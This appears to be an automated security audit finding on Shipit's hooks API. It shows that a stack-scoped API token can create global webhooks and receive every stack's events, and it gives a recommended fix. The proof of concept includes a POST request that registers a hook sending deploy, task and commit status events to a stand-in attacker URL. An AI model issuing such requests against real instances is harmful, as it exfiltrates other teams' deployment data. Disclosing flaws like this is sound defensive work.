The gap is in `app/controllers/shipit/api/hooks_controller.rb`. This is a legitimate authorization-scope binding break matching the "stack a token authorizes vs stack it touches" pattern in the ruleset.

### Title
Stack-scoped API tokens can create global webhooks and receive event data for every stack in the instance - (File: app/controllers/shipit/api/hooks_controller.rb)

### Summary
An `ApiClient` can optionally be restricted to a single `stack` [1](#0-0) , and `BaseController#stacks`/`#stack` enforce that restriction for every stack-scoped endpoint [2](#0-1) . However, `Api::HooksController` exposes both a stack-scoped route and a top-level, unscoped route (`resources :hooks, only: %i[index create show update destroy]` outside the stack scope) [3](#0-2) . On the unscoped route, `stack_id` simply returns `nil` because `params[:stack_id]` is absent, so `hooks` resolves to `Hook.where(stack_id: nil)` — i.e. the set of **global** hooks — without ever checking `current_api_client.stack_id` [4](#0-3) . Global hooks receive delivery for every stack's events (`for_stack` scope includes `stack_id: [nil, stack_id]`) [5](#0-4) .

### Finding Description
The equality that should hold is: `token.stack (the single stack an ApiClient is authorized for)` == `stack(s) whose task/deploy/commit_status/merge events the hook the token creates will receive`. For every other stack-scoped API resource, `BaseController#stack`/`#stacks` funnel through `current_api_client.stack_id`, so a stack-restricted token can never touch another stack's records [2](#0-1) . `HooksController`, though, only derives `stack_id` from the presence of a route param, not from the authenticated client's own restriction: `stack_id` is `nil` on the unscoped `/api/hooks` route regardless of what the token is scoped to [6](#0-5) . As long as the token carries the generic `write:hook`/`read:hook` permission (which is not stack-namespaced in the `PERMISSIONS` list) [7](#0-6) , `require_permission` grants access purely on the permission name, with no cross-check against `current_api_client.stack_id`. This is exactly analogous to the audited bug class: a field/scope that is checked in one binding (stack ID the token authorizes) is silently substituted by a different value (no stack ID at all → global) at the point where the sensitive action (subscribing to all stacks' events) actually happens.

### Impact Explanation
An attacker who only holds an `ApiClient` token scoped to a single stack (e.g. a low-privilege integration deployed by a legitimate team) but with `write:hook` permission can call `POST /api/hooks` (not `/api/stacks/:id/hooks`) to register a hook with `delivery_url` pointing at an attacker-controlled server, listening to events like `deploy`, `task`, `commit_status`, `merge`, `pull_request` [8](#0-7) . That hook will subsequently receive `Hook.deliver` payloads for **every** stack in the Shipit instance, not just the one the token is authorized for [9](#0-8) . This is an unauthenticated-for-other-stacks read of stack state, task streams and deploy output flowing to an external endpoint chosen by the attacker — matching the "unauthenticated read of stack state, task streams or deploy output" High-impact category.

### Likelihood Explanation
Exploitation only requires possession of any `ApiClient` token that has been granted `write:hook`, which is common for CI/CD integrations; the token does not need `write:stack` or any stack-level privilege beyond its own assigned stack. No special conditions or races are required — a single `POST /api/hooks` call is sufficient, so likelihood is high wherever any hook-writing integration token exists outside the "unlimited" client.

### Recommendation
In `Api::HooksController`, when the current `ApiClient` is stack-restricted (`current_api_client.stack_id?`), reject or force-scope all `hooks`/`hook` access to that single stack — i.e., disallow creating/reading/updating/destroying global hooks (`stack_id: nil`) for scoped clients, and validate that `params[:stack_id]`, if present, matches `current_api_client.stack_id`.

### Proof of Concept
1. Create an `ApiClient` scoped to `stack: shipit_A` with `permissions: ['write:hook']` (mirrors the `here_come_the_walrus` fixture pattern with `write:hook` added) [10](#0-9) .
2. Authenticate with this token and call:
```
POST /api/hooks
{ "delivery_url": "https://attacker.example.com/collect", "events": ["deploy", "task", "commit_status"] }
```
This hits `Api::HooksController#create`, which only requires `write:hook` permission — `stack_id` resolves to `nil` because no `stack_id` route param is present [11](#0-10) [6](#0-5) .
3. From this point on, every `deploy`, `task`, and `commit_status` event for **all** stacks (including stacks the token was never authorized for) is POSTed to `https://attacker.example.com/collect` via `Hook.deliver`/`for_stack` [9](#0-8) .

```ruby
    scope :global, -> { where(stack_id: nil) }
    scope :scoped_to, ->(stack) { where(stack_id: stack.id) }
    scope :for_stack, ->(stack_id) { where(stack_id: [nil, stack_id]) }

    class << self
      def emit(event, stack, payload)
        raise "#{event} is not declared in Shipit::Hook::EVENTS" unless EVENTS.include?(event.to_s)

        Shipit::EmitEventJob.perform_later(
          event: event.to_s,
          stack_id: stack&.id,
          payload: coerce_payload(payload)
        )
        deliver_internal_hooks(event, stack, payload)
      end

      def deliver_internal_hooks(event, stack, payload)
        Shipit.internal_hook_receivers.each do |receiver|
          receiver.deliver(event, stack, payload)
        end
      end

      def deliver(event, stack_id, payload)
        for_stack(stack_id).listening_event(event).each do |hook|
          hook.deliver!(event, payload)
        end
      end
```
